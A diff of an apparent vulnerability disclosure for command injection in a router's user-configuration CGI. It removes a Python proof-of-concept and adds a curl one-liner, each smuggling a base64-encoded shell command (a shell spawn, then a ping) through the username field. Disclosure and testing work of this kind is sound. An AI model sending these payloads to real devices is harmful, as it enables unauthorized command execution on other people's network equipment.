@@ -71,41 +71,10 @@ username=Jztsczsn&privilege=2&oldpass=&newpass=MTIz&confpass=MTIz&deluser=%E5%88
 ​	 this vulnerability requires the user to have permission to configure the router
 
 ##### POC&&EXP
-
-```python
-import requests
-import base64
-headers={
-	"Host":"192.168.33.9",
-	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
-	"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-	"Content-Type":"Content-Type",
-	"Origin":"http://192.168.33.9",
-	"Referer":"http://192.168.33.9/d_userconfig.asp",
-	"Cookie":"curShow=",
-	"Upgrade-Insecure-Requests":"1"
-}
-data={
-	"username":base64.b64encode("';sh;'"),#input Command
-	"privilege":"2",
-	"oldpass":"123",
-	"newpass":"MTIz",
-	"confpass":"MTIz",
-	"deluser":"\xe5\x88\xa0\xe9\x99\xa4",
-	"select":"s0",
-	"hiddenpass":"192.168.33.9",
-	"submit.htm?userconfig.htm":"Send",
-	"tokenid":"35005211"#Packet capture analysis
-}
-proxies={
-'http':'127.0.0.1:8080',
-'https':'127.0.0.1:8080'
-}
-#url="http://149.28.168.149/goform/form2systime.cgi"
-url="http://192.168.33.9/goform/form2userconfig.cgi"
-t=requests.post(url,headers=headers,data=data)
-print t.text
 ```
+curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDE5Mi4xNTguMzMuMDsn&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
+```
+ It will decode our command Base64 and execute it 
 
 ##### TEST
 
